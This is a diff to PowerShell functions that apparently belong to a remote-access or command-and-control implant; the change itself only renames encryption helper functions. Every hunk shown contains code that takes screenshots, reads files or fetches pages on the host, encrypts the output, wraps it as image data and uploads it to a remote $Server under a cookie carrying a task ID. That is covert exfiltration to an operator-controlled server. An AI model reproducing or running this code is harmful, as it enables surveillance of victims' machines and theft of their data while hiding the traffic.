@@ -338,7 +338,7 @@ Function Get-MultiScreenshot {
         ForEach ($number in 1..[int]$Quantity ) {
             try { $Output = Get-Screenshot } catch { $Output = $null }
             try {
-            $Output = Encrypt-String2 $key $Output
+            $Output = Encrypt-CompressedString $key $Output
             $UploadBytes = getimgdata $Output
             $eid = Encrypt-String $key $TaskId
             (Get-Webclient -Cookie $eid).UploadData("$Server", $UploadBytes)|out-null
@@ -407,7 +407,7 @@ function Download-File
             $preNumbers = New-Object byte[] 10
             $preNumbers = ($ChunkedByte+$totalChunkByte)
             $eid = Encrypt-String $key $TaskId
-            $send = Encrypt-Bytes $key ($preNumbers+$str.ToArray())
+            $send = Encrypt-RawData $key ($preNumbers+$str.ToArray())
             $UploadBytes = getimgdata $send
             (Get-Webclient -Cookie $eid).UploadData("$Server", $UploadBytes)|out-null
             $str.SetLength(0);
@@ -416,7 +416,7 @@ function Download-File
     } catch {
         $Output = "ErrorDownload: " + $error[0]
         $eid = Encrypt-String $key $TaskId
-        $send = Encrypt-String2 $key $output
+        $send = Encrypt-CompressedString $key $output
         $UploadBytes = getimgdata $send
         (Get-Webclient -Cookie $eid).UploadData("$Server", $UploadBytes)|out-null
     } finally {
@@ -584,7 +584,7 @@ Function Get-Webpage {
     $eid = Encrypt-String $key $TaskId
     $bytes = [System.Text.Encoding]::UTF8.GetBytes($file)
     $base64 = [Convert]::ToBase64String($bytes)
-    $Output = Encrypt-String2 $key $base64
+    $Output = Encrypt-CompressedString $key $base64
     $UploadBytes = getimgdata $Output
     (Get-Webclient -Cookie $eid).UploadData("$Server", $UploadBytes)|out-null
 }
